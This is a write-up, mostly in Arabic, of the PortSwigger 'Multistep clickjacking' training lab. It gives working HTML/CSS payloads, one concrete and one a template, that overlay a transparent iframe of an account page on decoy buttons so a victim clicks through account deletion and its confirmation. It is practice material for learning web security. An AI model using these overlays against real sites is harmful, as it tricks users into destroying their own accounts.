# Lab : Multistep clickjacking

https://portswigger.net/web-security/clickjacking/lab-multistep

- الفكره من ال Lab ده ان الموقع ممكن يبقي فيه اكتر من clickjacking ويبقي فيه اكتر من استغلال

```bash
1. <style>
    iframe {
        position: relative;
        width: 700px;
        height: 930px;
        opacity: 0.1;
        z-index: 2;
    }
    .decoy {
        position: absolute;
        z-index: 1;
    }
    #btn1 {
        top: 495px;
        left: 60px;
    }
    #btn2 {
        top: 300px;
        left: 200px;
    }
</style>

<div id="btn1" class="decoy">Click me first</div>
<div id="btn2" class="decoy">Click me next</div>

<iframe src="https://0a1500210438f1d980f003ef000800ae.web-security-academy.net/my-account"></iframe>

2. <style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:$top_value1;
		left:$side_value1;
		z-index: 1;
	}
   .secondClick {
		top:$top_value2;
		left:$side_value2;
	}
</style>
<div class="firstClick">Test me first</div>
<div class="secondClick">Test me next</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

### اللاب ده بيتكلم عن إيه؟

اللاب اسمه **Multistep Clickjacking** وهو من سلسلة كليكجاكينج بتاعة PortSwigger Web Security Academy، ومستواه Practitioner.

**الفكرة الأساسية للثغرة (Clickjacking):**

المهاجم بيعمل صفحة وهمية فيها عناصر خداعية زي "Click me"، وبيحط تحتها **iframe شفاف (opacity قريبة من صفر)** فيه الموقع الحقيقي اللي الضحية عامل login فيه. الضحية بيفتكر إنه بيدوس على زرار عادي في صفحة المهاجم، بس في الحقيقة هو بيدوس على زرار حقيقي جوه الـ iframe المخفي فوق الموقع الأصلي.

**ليه اللاب ده تحديدًا بيتسمى "Multistep"؟**

لأن وظيفة "Delete account" في الموقع ده متحمية بحاجتين:

1. **CSRF token** (يعني مش ممكن تعمل الهجوم عن طريق فورم عادي بره الموقع)
2. **Confirmation dialog** يعني لما تدوس Delete، بتظهرلك رسالة تأكيد كمان لازم تدوسها

يعني الهجوم العادي (كليك واحد) مش هيكفي — لازم المهاجم يخدع الضحية إنها تدوس **مرتين على التوالي**: مرة على زرار "Delete account" ومرة على زرار التأكيد. فبيحط عنصرين وهميين "Click me first" و"Click me next" فوق الزرارين الحقيقيين بالظبط، بحيث الترتيب والمكان يتظبطوا مع بعض.
